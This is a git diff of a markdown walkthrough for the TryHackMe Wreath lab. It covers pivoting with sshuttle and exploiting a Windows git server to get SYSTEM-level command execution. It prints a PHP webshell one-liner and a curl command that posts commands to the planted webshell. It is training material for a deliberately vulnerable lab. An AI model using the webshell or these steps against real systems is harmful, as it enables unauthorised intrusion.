@@ -995,22 +995,24 @@
    Thinking about the interesting service on the next target that we discovered in the previous task, pick a pivoting technique and use it to connect to this service, using the    web browser on your attacking machine! 
 
    As a word of advice: sshuttle is highly recommended for creating an initial access point into the rest of the network. This is because the firewall on the CentOS target will    prove problematic with some of the techniques shown here. We will learn how to mitigate against this later in the room, although if you're comfortable opening up a port        using FirewallD then port forwarding or a proxy would also work.
+   
+   ![image](https://user-images.githubusercontent.com/68686150/115828022-c07e0c80-a42a-11eb-87db-ea45693d344e.png)
 
-  ![image](https://user-images.githubusercontent.com/68686150/115670216-cb6f6900-a366-11eb-96df-aaa2d8fc8027.png)
+   ![image](https://user-images.githubusercontent.com/68686150/115670216-cb6f6900-a366-11eb-96df-aaa2d8fc8027.png)
   
-  ![image](https://user-images.githubusercontent.com/68686150/115670293-e0e49300-a366-11eb-9d45-9800dd37112a.png)
+   ![image](https://user-images.githubusercontent.com/68686150/115670293-e0e49300-a366-11eb-9d45-9800dd37112a.png)
  
-  Head to the login screen of this application. This can be done by adding the answer to the previous question on at the end of the url, e.g. if using sshuttle:
+   Head to the login screen of this application. This can be done by adding the answer to the previous question on at the end of the url, e.g. if using sshuttle:
    
       http://IP/ANSWER
   
-  ![image](https://user-images.githubusercontent.com/68686150/115670490-18ebd600-a367-11eb-8fc9-1f6ca96969f3.png)
+   ![image](https://user-images.githubusercontent.com/68686150/115670490-18ebd600-a367-11eb-8fc9-1f6ca96969f3.png)
 
-  When navigating to this URI, we are given the following login page:
+   When navigating to this URI, we are given the following login page:
   
-  ![image](https://user-images.githubusercontent.com/68686150/115670419-05406f80-a367-11eb-9fbf-8d1f099c2730.png)
+   ![image](https://user-images.githubusercontent.com/68686150/115670419-05406f80-a367-11eb-9fbf-8d1f099c2730.png)
 
-  ![image](https://user-images.githubusercontent.com/68686150/115670532-25702e80-a367-11eb-9feb-122d9830a9af.png)
+   ![image](https://user-images.githubusercontent.com/68686150/115670532-25702e80-a367-11eb-9feb-122d9830a9af.png)
 
 
 ***[Task 19]: Git Server Code Review***
@@ -1043,6 +1045,86 @@
    We are, however, interested in the last 6 lines of the exploit:
  
    ![alt text](https://assets.tryhackme.com/additional/wreath-network/0c95035c81e7.png)
+
+   These create a PHP webshell (<?php system($_POST['a']); ?>) and echo it into a file called exploit.php under the webroot. This can then be accessed by posting a command to      the newly created /web/exploit.php file.
+
+   For the sake of not spoiling things for other users, we are going to alter this before running the script.
+
+   We can leave the payload as it is, but we will alter both instances of "exploit.php" in the script to be exploit-USERNAME.php, for example:
+
+   ![alt_text](https://assets.tryhackme.com/additional/wreath-network/312cae5fdfc7.png)
+
+   ![image](https://user-images.githubusercontent.com/68686150/115827060-6761a900-a429-11eb-93ae-27ed84e366be.png)
+
+
+***[Task 20]: Git Server Exploitation***
+
+   In the previous task we had a look through the source code of the exploit we found, identified the lines which needed to be updated, then made the necessary changes.
+
+   But first start the proxy. We can use any proxy but as a word of advice: sshuttle is highly recommended for creating an initial access point into the rest of the network. 
+ 
+       sshuttle -r root@10.200.90.200 --ssh-cmd "ssh -i id_rsa" 10.200.90.0/24 -x 10.200.90.200 -v
+
+   ![image](https://user-images.githubusercontent.com/68686150/115827758-5e250c00-a42a-11eb-89cc-f1ed0a52a2c1.png)
+
+   ![image](https://user-images.githubusercontent.com/68686150/115828142-ec00f700-a42a-11eb-9a5b-18e589480412.png)
+ 
+   Success!
+
+   Not only did the exploit work perfectly, it gave us command execution as NT AUTHORITY\SYSTEM, the highest ranking local account on a Windows target.
+
+   From here we want to obtain a full reverse shell. We have two options for this:
+
+   - We could change the command in the exploit and re-run the code
+   - We could use our knowledge of the script to leverage the same webshell to execute more commands for us, without performing the full exploit twice
+   
+   Option number two is a lot quieter than option number 1, so let's use that.
+
+   The webshell we have uploaded responds to a POST request using the parameter "a" (by default). This means that we have two easy ways to access this. We could use cURL from      the command line, or BurpSuite for a GUI option.
+
+   With cURL:
+  
+     curl -X POST http://IP/web/exploit-USERNAME.php -d "a=COMMAND"
+
+   ![image](https://user-images.githubusercontent.com/68686150/115828374-439f6280-a42b-11eb-80e7-5ffe9e0021c4.png)
+
+     Note: in this screenshot, gitserver.thm has been added to the /etc/hosts file on the attacking machine, mapped to the target IP address.
+
+   With BurpSuite:
+
+   We first turn on our Burp proxy (see the Burpsuite room if you need help with this!) and navigate to the exploit URL:
+
+   [!alt_text](https://github.com/kashyap-source/Try-Hack-Me/blob/master/Wreath/Image/Screenshot_1.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
